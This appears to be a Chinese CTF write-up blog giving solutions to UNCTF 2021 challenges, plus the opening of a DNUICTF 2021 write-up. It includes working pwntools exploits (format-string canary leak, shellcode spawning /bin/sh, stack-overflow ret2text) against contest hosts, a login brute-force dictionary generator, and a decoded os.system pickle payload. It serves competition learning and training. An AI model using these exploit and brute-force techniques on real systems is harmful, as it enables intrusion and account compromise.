&#x27;data&#x27;: _0x326c0f[&#x27;otSyR&#x27;](&#x27;data=&#x27;, _0x4833f6), &#x27;success&#x27;: function(_0x1626c4) &#123; coco[&#x27;alert&#x27;](&#123; &#x27;title&#x27;: &#x27;鎻愮ず&#x27;, &#x27;text&#x27;: _0x1626c4 &#125;); if (_0x326c0f[&#x27;DTeqY&#x27;](_0x1626c4, &#x27;登录成功&#x27;)) &#123; _0x326c0f[&#x27;IeKGb&#x27;](setTimeout, function() &#123; location[&#x27;reload&#x27;](); &#125;, 0x3e8); &#125; &#125; &#125;);&#125;);;_0xod5 = &#x27;jsjiami.com.v6&#x27; 分析发现，前端输入的账号密码，以 username|-|password 的方式组合后，再经RSA加密得到base64密文。 生成爆破用字典： 123456789101112131415161718192021import base64from Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5from Crypto.PublicKey import RSAfrom tqdm import tqdmf = open(&#x27;dict.txt&#x27;,&#x27;w&#x27;)public_key = &#x27;&#x27;&#x27;-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQD6US5bbJ7JrsKYeSa8goPJQBgUWXdNyUxtPfcwuCrsYEcWNdnk1fpIdSfUvrku39fYl+h1ciyanp5H79uSzuqsUrPEHzb2y+GTqdmNzZ53JPcxrFlYMv3NX0EOk3qMzgcSV/qXcAc+fWxLSTV5OVeWV8LrKJVXPMuQVgrw/SxkBQIDAQAB-----END PUBLIC KEY-----&#x27;&#x27;&#x27;for i in tqdm(range(10000)): password = str(i) m = &#x27;admin|-|&#x27; + password rsakey = RSA.importKey(public_key) cipher = Cipher_pkcs1_v1_5.new(rsakey) cipher_text = base64.b64encode(cipher.encrypt(m)) f.write(cipher_text+&#x27;\\n&#x27;) 最后上Burpsuite，加载新字典dict.txt，爆破拿到flag。 ​ # Pwnfo关键代码： 12345678910111213141516171819202122232425262728293031323334int __cdecl main(int argc, const char **argv, const char **envp)&#123; setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); speaking(); leak(); return 0;&#125;int speaking()&#123; return puts( &quot;Do you know the format string?\\n&quot; &quot; you can message at here:\\n&quot; &quot; https://wiki.x10sec.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/&quot;);&#125;unsigned __int64 leak()&#123; char s[88]; // [rsp+0h] [rbp-60h] BYREF unsigned __int64 v2; // [rsp+58h] [rbp-8h] v2 = __readfsqword(0x28u); puts( &quot;I heared that you are interested in the CTF.\\n&quot; &quot; I hope that you will hold on to keep your interest\\n&quot; &quot; tell me,will you?&quot;); fgets(s, 80, stdin); puts(&quot;I will remember what you said&quot;); printf(s); puts(&quot;wait for your good news...&quot;); gets(s); return __readfsqword(0x28u) ^ v2;&#125; checksec发现存在canary，利用leak() 中存在的格式化字符串漏洞泄露canary，再实现ret2text。 Payload： 1234567891011121314151617from pwn import *r=remote(&#x27;node2.hackingfor.fun&#x27;,38793)[r.recvline() for i in range(6)]r.sendline(&#x27;%17$p&#x27;)r.recvline()canary = int(r.recvline().strip()[2:],16)print(hex(canary))r.recvline()backdoor_addr = 0x40080Dpl = &#x27;a&#x27;*(0x60-8)+p64(canary)+&#x27;a&#x27;*8+p64(backdoor_addr)r.sendline(pl)print(r.recvall()) ​ sc关键代码： 123456789101112131415161718192021int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf[16]; // [rsp+0h] [rbp-10h] BYREF setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); init(); puts(&quot;Do you know the ShellCode?&quot;); puts(&quot;\\n\\n\\n---------^-^----------&quot;); puts(&quot;show me your Migic&quot;); read_shell_code(); puts(&quot;Have you finished?&quot;); read(0, buf, 0x20uLL); puts(&quot;~Bye&quot;); return 0;&#125;ssize_t read_shell_code()&#123; return read(0, &amp;buf, 0x5AuLL);&#125; read_shell_code() 将输入的shellcode写入bss段 buf 区域，再通过 read() 实现ret2shellcode。 Payload： 12345678910111213141516171819202122from pwn import *r = remote(&#x27;node2.hackingfor.fun&#x27;,34717)context.arch = &#x27;amd64&#x27;r.recvuntil(&#x27;show me your Migic\\n&#x27;)shellcode = asm(&#x27;&#x27;&#x27;mov rbx,0x68732f6e69622fpush rbxmov rdi,rspxor rsi,rsixor rdx,rdxmov rax,0x3bsyscall&#x27;&#x27;&#x27;)print(shellcode)r.send(shellcode)r.recvline()bss_addr = 0x601080pl = &#x27;a&#x27;*(0x10+8)+p64(0x601080)r.send(pl)r.interactive() ​ magic_int关键代码： 123456789101112131415161718192021222324int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [rsp+Ch] [rbp-4h] BYREF setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); __isoc99_scanf(&amp;unk_400959, &amp;v4); if ( v4 &lt; 0 ) &#123; v4 = -v4; if ( v4 &lt; 0 ) EDG(); &#125; return 0;&#125;__int64 EDG()&#123; char v1[112]; // [rsp+0h] [rbp-70h] BYREF puts(s); return gets(v1);&#125; c中int取值范围为 -2147483648 ~ +2147483647，而 -2147483648 刚好为取反发生上溢的数，传入即可进入 EDG()，再ret2text。 Payload： 123456789101112from pwn import *r = remote(&#x27;node2.hackingfor.fun&#x27;,38780)backdoor = 0x400781r.send(&#x27;-2147483648\\x00&#x27;)p.recv()pay = &#x27;a&#x27; * 0x77 + p64(backdoor)r.send(pay)r.interactive() ​ magic_abs关键代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354int __cdecl main(int argc, const char **argv, const char **envp)&#123; unsigned int v3; // eax unsigned int v5; // [rsp+Ch] [rbp-84h] BYREF char s[92]; // [rsp+10h] [rbp-80h] BYREF int v7; // [rsp+6Ch] [rbp-24h] BYREF time_t timer; // [rsp+70h] [rbp-20h] BYREF __int64 v9; // [rsp+78h] [rbp-18h] unsigned int v10; // [rsp+80h] [rbp-10h] int v11; // [rsp+84h] [rbp-Ch] unsigned int v12; // [rsp+88h] [rbp-8h] unsigned int v13; // [rsp+8Ch] [rbp-4h] init(argc, argv, envp); v3 = time(&amp;timer); srand(v3); memset(s, 0, 0x50uLL); puts(&quot;What&#x27;s your name?&quot;); v11 = read(0, s, 0x50uLL); puts(&quot;Tell me your a g e:&quot;); fflush(stdout); __isoc99_scanf(&quot;%d&quot;, &amp;v7); puts(&quot;What&#x27;s your lucky number?&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v5); v10 = abs32(v5); v9 = (int)(v10 + v11); v12 = 1; if ( v9 &gt;= 0 ) &#123; s[10] = 0; printf(&quot;Hi,%s And see you next time!\\n&quot;, s); v12 = 0; &#125; puts(&quot;Recording...&quot;); if ( v12 ) v13 = rand() % (((int)abs32(v5 + v7) &gt;&gt; v7) + 1); else v13 = rand() % 10000; record(s, v5, v13, v12); return 0;&#125;void *__fastcall record(const char *a1, unsigned int a2, unsigned int a3, int a4)&#123; size_t v4; // rax char dest[16]; // [rsp+20h] [rbp-10h] BYREF printf(&quot;\\n name: %s \\n lucky number: %d \\n tag: %d\\n DOWN!\\n&quot;, a1, a2, a3); v4 = strlen(a1); if ( a4 ) return memcpy(&amp;dest[a3], a1, v4); else return memcpy(dest, a1, v4);&#125; 构造 v7 和 v5，使得 (((int)abs32(v5 + v7) &gt;&gt; v7) + 1) 为1，v13 不再随机只能取0，在 record() 中，输入的 s 作为payload复制到 dest 区域，造成栈溢出。 本地测试： 123456789#include &lt;stdio.h&gt;#include &lt;math.h&gt;#include &lt;stdlib.h&gt;int main() &#123; unsigned int v5 = -2147483647; printf(&quot;%d\\n&quot;,(int)v5); //-2147483647 int v7 = 2147483647; printf(&quot;%d\\n&quot;,((int)(v5+v7))&gt;&gt;v7); //0&#125; Payload： 12345678910111213from pwn import *r = remote(&#x27;node2.hackingfor.fun&#x27;,36236)print(r.recvline())backdoor_addr = 0x4009D7pl = &#x27;a&#x27;*(0x10+8)+p64(backdoor_addr)r.send(pl)print(r.recvline())r.sendline(&#x27;2147483647&#x27;)print(r.recvline())r.sendline(&#x27;-2147483647&#x27;)r.interactive() ​ # Reverseezlogin 程序流程识别，算法逆向 login() 中 pqsd`fl&#123;zmpZsag&#125;wdYVkUNC 与 0x16 异或得到 fgervpzml&#123;fLewqkarO@&#125;CXU，再8位一组上下排列，从上往下取出连成：flag&#123;refOrL@ve&#125;pwCzqXmkU。 flag：flag&#123;refOrL@ve&#125; ​ rejunk 垃圾代码混淆，异或算法逆向 查看伪代码发现夹进很多垃圾代码，跟进几行有用的代码： 123456__main();puts(&quot;input your answer:&quot;);scanf(&quot;%s&quot;, v14);sprintf(Buffer, &quot;%s%s%s%s&quot;, &quot;WQGUL&quot;, &quot;xb&gt;2:&quot;, &quot;ooh95=&quot;, &quot;&#x27;&#x27;twk&quot;);if ( (v9 ^ (v14[v9] + 2)) != Buffer[v9] ) break; 脚本逆解： 1234567s = list(b&#x27;&#x27;&#x27;WQGULxb&gt;2:ooh95=&#x27;&#x27;twk&#x27;&#x27;&#x27;)t = []for i in range(len(s)): t.append((s[i]^i)-2)print(bytes(t))# b&#x27;UNCTF&#123;b781cbb29054db&#125;&#x27; flag：UNCTF&#123;b781cbb29054db&#125; ​ py_trade EZ opcode! Give me your PY, and i’ll give you flag! 还原python字节码： 123456789flag = &#x27;XXXXXX&#x27;num = [0]*18k = 0for i in range(len(flag)): num[i] = (ord(flag[i])+i)^(k%3+1) num[len(flag)-i-1] = (ord(flag[len(flag)-i-1])+len(flag)-i-1)^(k%3+1) k += 1print(num)#[115, 120, 96, 84, 116, 103, 105, 56, 102, 59, 127, 105, 115, 128, 95, 124, 139, 49] 用z3解： 12345678910111213141516171819from z3 import *s = Solver()num = [115, 120, 96, 84, 116, 103, 105, 56, 102, 59, 127, 105, 115, 128, 95, 124, 139, 49]flag = [BitVec(&#x27;flag%d&#x27;%i,8) for i in range(len(num))]res = [-1]*len(num)k = 0for i in range(len(num)): res[i] = (flag[i]+i)^(k%3+1) res[len(flag)-i-1] = (flag[len(flag)-i-1]+len(flag)-i-1)^(k%3+1) k += 1for i in range(len(num)): s.add(res[i]==num[i])if s.check() == sat: m = s.model() print(&#x27;&#x27;.join(chr(m[i].as_long()) for i in flag)) # py_Trad3_1s_fuNny! flag：unctf&#123;py_Trad3_1s_fuNny!&#125; ​ ezDriver 你了解过驱动嘛？试试看吧！ 分析逻辑，DriverEntry() -&gt; sub_140086000() -&gt; sub_140085268() -&gt; sub_140085000() -&gt; sub_140085020()。 主程序逻辑在 sub_140085020()： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455__int64 __fastcall sub_140085020(volatile void *Address, __int64 a2)&#123; int v4; // ecx __int64 v5; // rax unsigned __int64 v6; // r8 int v8; // ecx __int64 v9; // [rsp+20h] [rbp-828h] char v10[2048]; // [rsp+30h] [rbp-818h] BYREF sub_140001640(v10, 0i64, 2048i64); ProbeForRead(Address, 0x800ui64, 1u); DbgPrintEx(0x4Du, 3u, &quot;[+] UserBuffer: 0x%p\\n&quot;, (const void *)Address); DbgPrintEx(0x4Du, 3u, &quot;[+] UserBuffer Size: 0x%zX\\n&quot;, a2); DbgPrintEx(0x4Du, 3u, &quot;[+] KernelBuffer: 0x%p\\n&quot;, v10); DbgPrintEx(0x4Du, 3u, &quot;[+] KernelBuffer Size: 0x%zX\\n&quot;, 0x800ui64); v4 = 0; LODWORD(v9) = 0; while ( (unsigned __int64)v4 &lt; 0x200 ) &#123; byte_140083090[v4] = v10[4 * v4]; LODWORD(v9) = ++v4; &#125; sub_140001000(byte_140083090, (unsigned int)dword_140003028, &amp;unk_140003030);// XXTEA加密 v5 = -1i64; v6 = -1i64; do ++v6; while ( byte_140003000[v6] ); do ++v5; while ( byte_140083090[v5] ); if ( v5 == v6 ) &#123; v8 = 0; HIDWORD(v9) = 0; while ( v8 &lt; v6 ) &#123; if ( byte_140003000[v8] != byte_140083090[v8] )// 比较 &#123; DbgPrintEx(0x4Du, 3u, &quot;[*] flag wrong!&quot;, byte_140003000, v9); return 0i64; &#125; HIDWORD(v9) = ++v8; &#125; DbgPrintEx(0x4Du, 3u, &quot;[*] you are right@&quot;, byte_140003000, v9); DbgPrintEx(0x4Du, 3u, &quot;[+] Triggering Buffer Overflow in Stack\\n&quot;); sub_140001380(v10, Address, a2); return 0i64; &#125; else &#123; DbgPrintEx(0x4Du, 3u, &quot;[*] flag Wrong!&quot;, byte_140003000, v9); return 0i64; &#125;&#125; 发现通过加密函数 sub_140001000() 后，得到的结果 byte_140083090 与 byte_140003000 作比较。 跟进加密函数 sub_140001000()，由特征知为XXTEA加密算法，使用的key为 unk_140003030=[1,2,3,4]。 脚本解密： 1234567891011121314151617181920212223242526272829303132def shift(z, y, x, k, p, e): return ((((z &gt;&gt; 5) ^ (y &lt;&lt; 2)) + ((y &gt;&gt; 3) ^ (z &lt;&lt; 4))) ^ ((x ^ y) + (k[(p &amp; 3) ^ e] ^ z)))def decrypt(v, k): delta = 0x9E3779B9 n = len(v) rounds = 6 + 52 // n x = (rounds * delta) &amp; 0xFFFFFFFF y = v[0] for i in range(rounds): e = (x &gt;&gt; 2) &amp; 3 for p in range(n - 1, 0, -1): z = v[p - 1] v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF y = v[p] p -= 1 z = v[n - 1] v[0] = (v[0] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF y = v[0] x = (x - delta) &amp; 0xFFFFFFFF return vif __name__ == &#x27;__main__&#x27;: key = [1, 2, 3, 4] s = &#x27;184E8E7F2E69B702EEAA503990DEE59FAE4C4D06937164208B0234B83CA1884A21671A3783D1F2B1&#x27; s = [s[8*k:8*k+8] for k in range(len(s)//8)] s = [bytes.fromhex(k)[::-1].hex() for k in s] encrypted = [int(k,16) for k in s] decrypted = decrypt(encrypted, key) decrypted = [hex(k)[2:] for k in decrypted][:-1] flag = [bytes.fromhex(k)[::-1] for k in decrypted] print(b&#x27;&#x27;.join(flag))# b&#x27;unctf&#123;Do_you_want_to_a_cup_of_tea?&#125;&#x27; flag：unctf&#123;Do_you_want_to_a_cup_of_tea?&#125; ​ # Cryptoeasy_rsa 简单的RSA 1234q= 9961202707366965556741565662110710902919441271996809241009358666778850435448710324711706845973820669201482939820488174382325795134659313309606698334978471p= 12525187149887628510447403881107442078833803097302579419605689530714690308437476207855511625840027119860834633695330551080761572835309850579517639206740101c= 28587419802025513525354713621431206010395084854419372005671024739235625817936539010481222419824634956610184430308528941304950093228826213143262329902946812513518444587906469224383320964300417189270202019231856531012143472434842753891213128487132962453421971000901646523331476667655739056951415917218673801225e = 65537 RSA基操。 1234567891011q = 9961202707366965556741565662110710902919441271996809241009358666778850435448710324711706845973820669201482939820488174382325795134659313309606698334978471p = 12525187149887628510447403881107442078833803097302579419605689530714690308437476207855511625840027119860834633695330551080761572835309850579517639206740101c = 28587419802025513525354713621431206010395084854419372005671024739235625817936539010481222419824634956610184430308528941304950093228826213143262329902946812513518444587906469224383320964300417189270202019231856531012143472434842753891213128487132962453421971000901646523331476667655739056951415917218673801225e = 65537import gmpy2fn = (p-1)*(q-1)d = gmpy2.invert(e,fn)m = pow(c,d,p*q)print(bytes.fromhex(hex(m)[2:]))# b&#x27;UNCTF&#123;Th1s_1s_f1ag_f0r_unctf_2021!!&#125;&#x27; ​ 探秘中世纪城堡 贝拉在参观一个中世纪的古堡时，在桌上看到了一串一奇怪的字符和描述。你能帮大聪明破解皇珈骑士留下来的谜团吗？ 年轻的大帝率领着64位皇珈骑士冲破了双重阻栏夺下了城池。AZSLh2OofBA0C2qzi25mg2KsYqW7iCSdDq9aBLKsDBWyi259 ROT21+base64+栅栏2。 flag：UNCTF&#123;subscribe_to_Xiangwandamowang&#125; ​ 分析badusb流量 一日，某企业的安全管理员发现企业中的电脑遭到了badusb的侵害，以下他分离出来的有问题USB流量，而这似乎跟键盘的键位映射有关。 2018 2011 2006 2017 2009 202f 201C 0027 0018 002D 2004 0015 0008 002D 0019 0008 0015 001C 002D 0011 001E 0006 0008 2030 键盘键位映射规则，映射关系参考《USB键盘协议中键码》中的HID Usage ID。 前两位20代表大写，10代表小写，后两位为键码，对照写flag。 flag：UNCTF&#123;Y0u-Are-very-n1ce&#125; ​ baby_rsa 123456789101112131415161718import gmpy2import libnumimport randomimport uuidflag=&quot;unctf&#123;&quot;+str(uuid.uuid4())+&quot;&#125;&quot;m=libnum.s2n(flag)p=libnum.generate_prime(1024)q=libnum.generate_prime(1024)n=p*qe=65537c=pow(m*p+n,e,n)print(&quot;n=&quot;,n)print(&quot;c=&quot;,c)print(&quot;e=&quot;,e)#n= 27023180567533176673625876001733765250439008888496677405372613659387969480500400831799338479404533734632060401129194207025095826786316107611502577395964365591899893794206238112244571942694129959717225168573059987542436467778426312967832431595178558711258027999897974942046398583397445299861338203860420721585460676138091828032223153425728023656897880166788811969523526091221520293020106530587453637600349533427641518473788620430866128331962450325767202417824455886116760280239705754222948387172102353564657340216229891342124971948458724351338597649821310431397426705701275774039588035776573373417654649168810548916141#c= 3489599657527403893851973553294684608504140532554562294027722218597464669848608337663997115805201027340092733823019661706872544231209523772845492398492677185660213963118144668038183924970370481476141221609706208064428560732214361469135212057355342825193598971775551833240699393482839422273480793244841531126642199202744610656153155545415859410361595564197685655133074582118230993519133935533313364233668337427608419528430102794052261190930670933657287272452581248934890029409559234507626012423255430699687038808658327174609660874748540185589263800447650242593224189976058739054174360024536594384447518687126891675059#e= 65537 $c = (mp+n)^e \\% n = p^e(m+q)^e \\% n $， 有 $c\\%p = p^e(m+q)^e \\% p = \\Big((p^e \\% p)\\big((m+q)^e \\% p\\big)\\Big) \\% p=0$， 故 $c=kp$，又 $n=pq$，则 $p=\\gcd(c,n)$。 求出 $d \\equiv e^{-1} \\pmod {\\varphi(n)}$，可以得到 $m’ = mp+n = c^d \\% n$，所以 $m = \\cfrac{m’-n}{p}$。 123456789101112n = 27023180567533176673625876001733765250439008888496677405372613659387969480500400831799338479404533734632060401129194207025095826786316107611502577395964365591899893794206238112244571942694129959717225168573059987542436467778426312967832431595178558711258027999897974942046398583397445299861338203860420721585460676138091828032223153425728023656897880166788811969523526091221520293020106530587453637600349533427641518473788620430866128331962450325767202417824455886116760280239705754222948387172102353564657340216229891342124971948458724351338597649821310431397426705701275774039588035776573373417654649168810548916141c = 3489599657527403893851973553294684608504140532554562294027722218597464669848608337663997115805201027340092733823019661706872544231209523772845492398492677185660213963118144668038183924970370481476141221609706208064428560732214361469135212057355342825193598971775551833240699393482839422273480793244841531126642199202744610656153155545415859410361595564197685655133074582118230993519133935533313364233668337427608419528430102794052261190930670933657287272452581248934890029409559234507626012423255430699687038808658327174609660874748540185589263800447650242593224189976058739054174360024536594384447518687126891675059e = 65537p = gcd(n,c)q = n//pimport gmpy2fn = (p-1)*(q-1)d = gmpy2.invert(e,fn)m = int(pow(c,d,n)-n)//pprint(bytes.fromhex(hex(m)[2:]))# b&#x27;unctf&#123;rsa_s1mp1e_0kk&#125;&#x27; flag：unctf&#123;rsa_s1mp1e_0kk&#125; ​ 电信诈骗pro 朕是秦始皇，其实朕没有死，朕在西安兵马俑第四个坑第七排，朕是吃了长生不老药的，朕告诉你啊，朕在陕西有3000吨黄金和300万秦兵被封印，现在只需要30元就能解封，只要你打钱给朕，朕明天直接带部队复活，让你统领三军!建立像古罗马一样的帝国，君无戏言！ 朕的账户是5.#4&amp;;Sw)2Ti%*Sj1eUU9kTwi*Sj)1S&quot;a8S0)6x-8(x7= flag格式为unctf{} 尝试异或爆破，发现异或0x40有 unctf&#123;.7ir.)ej.*q%..y+.7)j.*iq.b!x.piv8mxh8w&#125;，说明中间加密方式不同。 提取中间部分尝试出是ROT47+凯撒17： 123456789s=&#x27;$HXa%:TY$;`6&amp;&amp;h&lt;%H:Y$;X`$Q2g$_XeI\\gWIf&#x27;for i in range(-200,200): t=&#x27;&#x27; for j in range(len(s)): if ord(s[j])+i &gt;=32 and ord(s[j])+i&lt;127: t+=chr(ord(s[j])+i) if len(t)==len(s): print(i,t) 其中 5Yir6Kej5LqG77yM6YKj5Liq5bCx5pivZmxhZw base64解码是 别解了，那个就是flag。 flag：unctf&#123;5Yir6Kej5LqG77yM6YKj5Liq5bCx5pivZmxhZw&#125; ​ # Misc简单日志审计 相传，在某一归隐门派的服务器里存在着众多盖世绝学，谁掌握了任一一本绝学谁就能一统CTF江湖，突然有一天门派的长老发现服务器的日志里存在着些许异常，或许这门绝学已经失窃了，请帮帮长老找出失窃的是哪一本绝学吧。flag格式为UNCTF{*} 日志文件里找到base64编码字符串 STAKcDAKMFMnY2F0IC9DVEY/WW91U2hvdUppdVhpbmcnCnAxCjAoZzAKbHAyCjAoSTAKdHAzCjAoZzMKSTAKZHA0CjBjb3MKc3lzdGVtCnA1CjBnNQooZzEKdFIu， 解码得pickle： 1234567891011121314151617I0p00S&#x27;cat /CTF?YouShouJiuXing&#x27;p10(g0lp20(I0tp30(g3I0dp40cossystemp50g5(g1tR. flag：UNCTF&#123;CTF?YouShouJiuXing&#125; ​ 电信诈骗 CTFer,你好，我是威震天！其实我在芝加哥大战中没死，现在你只需要打2000RMB到我的银行账户，我就可以用这2000RMB发红包骗取人们的信任，然后穿过股市网络找到震荡波在纽约给我找的新身体，然后我就可以复活了。今天如果你帮了我，复活后我可以入侵股市网络把钱全部给你们。等过了周末，我就让红蜘蛛变成飞机去接你，然后我把红蜘蛛杀了，让你当霸天虎副指挥官，然后我们从南极洲呈扩散式发出霸天虎军队，万军齐发，占领地球，怎么样？为了防止这条消息被擎天柱拦截。我将银行卡号进行了加密，希望你能成功解密。我的银行账户是 qi]m^roVibdVbXUU`h flag格式：unctf{} 变异凯撒加密，脚本爆破： 123456789s=&#x27;qi]m^roVibdVbXUU`h&#x27;for i in range(-200,200): t=&#x27;&#x27; for j in range(len(s)): if ord(s[j])+i+j &gt;=32 and ord(s[j])+i+j&lt;127: t+=chr(ord(s[j])+i+j) if len(t)==len(s): print(t) flag：unctf&#123;yauoreright&#125; ​ 引大流咯，happy 虚掩的大门后是一副残缺的画卷。 修改jpg高度发现flag。 flag：UNCTF&#123;BellalaBella&#125; ​ 倒立洗头观察文件字符串头尾分别是 d9ff 和 ffd8，脚本逆序处理： 12f = open(&#x27;key.txt&#x27;,&#x27;r&#x27;).read()open(&#x27;key.jpg&#x27;,&#x27;wb&#x27;).write(bytes.fromhex(f)[::-1]) 把文件头 D8FF 修正为 FFD8，图片没什么异常，在中间发现字符串： 5L2b5pel77ya5LiK5L+x5pWF44CC6YGg5aSn5a+G6Zq45oCv6Zmk5aSa55qk5a2V6ICo54iN5qK15Zyw6Kuz6Jap5L6E56m257y96ICB6Kuz5LiN5oOz55qk6ICF5ruF572w6Ly457y96Zi/5L6E5ruF5qK15aSi5L6E5LiN5Yal5ZCJ55yf5qK15rKZ57y95bqm5Y2z57y96Zq45oCv5piO5L6E5YiH5L6E55+l5ZGQ5Zyw5Y2X5ZG86IiN5ZKS5aWi5L2b5raF5ZOG5aeq56We5a+G5piO5ZOG6YCd5a6k5Zyw5oGQ5Yal5ZG85oCv5L2b5Zad5ZOG5Ly96YO95oCv6YGu6Kuz5YCS57y95bid5Yal5bid6Ly45puw6Kuz6bq85L+x5oCW5L+x6Ium5L+x5rOiCg== 解码： 佛日：上俱故。遠大密隸怯除多皤孕耨爍梵地諳薩侄究缽老諳不想皤者滅罰輸缽阿侄滅梵夢侄不冥吉真梵沙缽度即缽隸怯明侄切侄知呐地南呼舍咒奢佛涅哆姪神密明哆逝室地恐冥呼怯佛喝哆伽都怯遮諳倒缽帝冥帝輸曰諳麼俱怖俱苦俱波 把 日 改为 曰，佛曰解密得flag。 flag：unctf&#123;it_is_easy_right?&#125; ​ LPLpng图片用010 editor查看，第9-15个块CRC值错误，提取Hex值 4544476e622121，解Hex得 EDGnb!!。 以此为密码解压缩包，flag.txt 提示 https://www.bilibili.com/bangumi/play/ep431768?from=search&amp;seid=2681339926644936228&amp;spm_id_from=333.337.0.0，以及一个 2021/11/24 14:11 的时间，访问B站视频在评论区找到 2021/11/24 14:11 的评论见flag。 flag：flag&#123;LpL_zgbr_rNg_eDg777&#125; ​","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"第一届东软杯网络CTF竞赛-DNUICTF","slug":"match-第一届东软杯网络CTF竞赛DNUICTF","date":"2021-12-05T12:40:24.000Z","updated":"2021-12-05T17:56:56.779Z","comments":true,"path":"2021/12/05/match-第一届东软杯网络CTF竞赛DNUICTF/","permalink":"https://lazzzaro.github.io/2021/12/05/match-%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%B8%9C%E8%BD%AF%E6%9D%AF%E7%BD%91%E7%BB%9CCTF%E7%AB%9E%E8%B5%9BDNUICTF/","excerpt":"","text":"​ 由大连市公安局作为指导单位，大连东软信息学院主办，网络安全工作室承办，大连东软信息学院网络与信息中心、计算机学院、软件学院，品牌发展部、微光网络工作室协办，品牌发展部与微光网络工作室提供设计支持，大连暗泉信息技术有限公司赞助支持的“暗泉杯”网络安全竞赛将于2021年12月份举行。该竞赛是运用信息安全知识的一次创新性竞赛活动，希望通过这次比赛增强我校学生的安全知识运用能力和经验积累。本次比赛也面向校外开放注册通道，旨在为信息安全领域爱好者提供一个交流和水平展示的舞台。 本次竞赛采用线上CTF（Capture The Flag，夺旗赛）赛制。选手充分运用自身掌握的各方面的知识与技能，设法解开题目，获得题目中的“Flag”并提交，得到分数，最终根据分数排名。内容涉及Reverse(逆向分析)，Web(Web漏洞利用)，PWN（溢出类），Crypto(密码学)，Misc(混合杂项题)等方面。 竞赛时间 2021年12月4日 10：00—2021年12月5日22：00（36个小时） 报名平台链接：http://ctf.neusoft.edu.cn/ Rank: 9 MISC[签到]签到 除特别说明外本次比赛flag的格式统一为 flag{字符串} 比如下面这个就是一个典型的flag flag{Dnui_ctf_2021_s1gn_in} 将上面的flag提交即可完成答题 另外本次CTF比赛会根据整体解题情况分批次放出题目 (解不出题时 可以等待下一波新题目放出继续作答) 请加入QQ群 630995618 或查看平台公告 关注题目动态 flag&#123;Dnui_ctf_2021_s1gn_in&#125;。 ​ [萌新]在哪呢 FLAG在哪呢 pdf内容全选复制，打开任一文本编辑器粘贴，发现flag：flag&#123;hey_there_is_no_thing&#125;。 ​ 只是个PNG，别想太多了.pngbinwalk命令查看png图片：binwalk -e PNG.png，分解出最后一个zlib块，发现flag：flag&#123;zhe_ti_mu_ye_tai_bt_le_XD&#125;。 ​ 压缩包压缩包压缩包压缩包zip压缩包套娃，每一层的密码是文件名，python脚本解套： 12345678910111213141516171819202122232425import zipfile import osnow = &quot;yasuobao.zip&quot;while 1: print(&quot;START &quot;+now) zfile = zipfile.ZipFile(now) password = zfile.namelist()[0].split(&#x27;.&#x27;)[0] try: zfile.extractall(members=zfile.namelist(), pwd=password.encode(&#x27;utf-8&#x27;)) zfile.close() try: os.remove(now) except OSError as e: print(e) names = os.listdir() print(names) for name in names: if name.endswith(&#x27;.zip&#x27;) and name != now: now=name break except: break print(&#x27;END &#x27;+now) 最后解压得到 23333.zip，打开发现注释提示密码6位数，ARCHPR爆破得756698，解压得flag：flag&#123;Unz1p_i5_So_C00l##&#125;。 ​ easystegpng图片，二维码用微信扫出内容 某种常见的隐写，用010editor 16进制查看，发现尾部有zip压缩包，提取出来，解压出 _find.png。 尝试高低位隐写、盲水印等无结果，考虑stegpy： stegpy _find.png 得到flag：flag&#123;Do_U_Kn0w_Ste9py??&#125;。 ​ range_download Hint: filter: dns Wireshark打开流量包文件，观察到有很多返回1字节的流，且请求中都带 xxx-xxx/2460 字符串，猜测为文件 flag.7z 的单字节断点下载 ，根据请求与响应特征，用脚本提取出所有1字节，并按相应位置填入数组，以字节形式写入文件。发现缺少第2349位字节，按照0x00-0xff分别填入，生成256个7z文件： 12345678910111213141516171819202122232425import ref = open(&#x27;range.pcapng&#x27;,&#x27;rb&#x27;).read()x1 = b&#x27;\\x0d\\x0aContent-Range: bytes &#x27;l1 = len(x1)pos1 = [i.start() for i in re.finditer(x1, f)]x2 = b&#x27;\\x0d\\x0aContent-Type: application/x-7z-compressed\\x0d\\x0a\\x0d\\x0a&#x27;l2 = len(x2)pos2 = [i.start() for i in re.finditer(x2, f)][1:]realpos = [int(f[k+l1:k+l1+10][:f[k+l1:k+l1+10].index(b&#x27;-&#x27;)]) for k in pos1]realval = [f[k+l2:k+l2+10][0] for k in pos2]out = [-1]*2460for i in range(len(pos1)): out[realpos[i]]=realval[i]print(out.index(-1))print(type(out[0]))for i in range(256): out[2349]=i outbyte = bytes(out) open(f&#x27;xxx/flag&#123;i&#125;.7z&#x27;,&#x27;wb&#x27;).write(outbyte) 生成的7z文件都加密，爆破无果。 后面放出提示 filter: dns，重新Wireshark打开流量包，过滤dns流量，发现域名 .nss.neusoft.edu.cn 前的主机名可以组成一串base64编码 cGFzc3dvcmQ6IG5zc195eWRzIQ==，解码有 password: nss_yyds!。 使用脚本批量尝试解压256个7z压缩包： 123456789101112131415161718192021222324252627import py7zrimport osdef uncompress(path_name): if py7zr.is_7zfile(path_name): try: d_name = &#x27;nss_yyds!&#x27; with py7zr.SevenZipFile(path_name,password=d_name, mode=&#x27;r&#x27;) as sevenZ_f: sevenZ_f.extractall(path_name.rsplit(&quot;.7z&quot;)[0]) except Exception as e: print(&#x27;Error when uncompress file! info: &#x27;, e) return False else: return True else: print(&#x27;This is not a true 7z file!&#x27;) return False if __name__ == &#x27;__main__&#x27;: folder_name = &#x27;xxx&#x27; os.chdir(folder_name) files = 